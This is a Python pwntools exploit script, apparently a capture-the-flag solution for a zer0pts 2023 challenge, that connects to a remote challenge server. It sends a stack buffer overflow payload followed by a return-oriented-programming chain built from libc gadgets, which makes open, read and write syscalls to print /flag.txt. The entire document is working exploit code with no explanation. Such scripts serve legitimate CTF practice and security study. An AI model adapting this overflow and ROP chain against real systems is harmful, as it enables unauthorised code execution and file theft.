#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

p = remote("pwn.2023.zer0pts.com", 9005)
# p = process(["./sandbox.py", "bin/vuln"])
libc = ELF("./lib/libc.so.6")

libc.address = 0x7fffb7ddb000
offset = 0x100 + 8

payload = b'A' * offset
payload += p64(0x6161616161616100)
payload += p64(0xbaddad)

rop = ROP(libc)

pop_rdi = rop.rdi[0]
pop_rsi = rop.rsi[0]
pop_rdx = rop.rdx[0]
pop_rax = rop.rax[0]
syscall = rop.find_gadget(["syscall", 'ret'])[0]

# read flag.txt str
rop.read(0, libc.bss(0x100), 0x30)

payload += rop.chain()
payload += flat(
    # open
    pop_rdi,
    libc.bss(0x100),
    pop_rsi,
    int(constants.O_RDONLY),
    pop_rdx,
    0,
    pop_rax,
    2,
    syscall,

    # read
    pop_rdi,
    3,
    pop_rsi,
    libc.bss(0x100),
    pop_rdx,
    0x100,
    pop_rax,
    0,
    syscall,

    # write
    pop_rdi,
    1,
    pop_rsi,
    libc.bss(0x100),
    pop_rdx,
    0x100,
    pop_rax,
    1,
    syscall
)

p.recv()
# qdb
# p.sendline(b"n")
# p.sendline(b"n")
# p.sendline(b"n")
# p.sendline(b"b 0x7fffb7dd721f")
# p.sendline(b"c")
# p.recv()
p.sendline(payload)
p.sendline(b"/flag.txt\x00")

p.interactive()
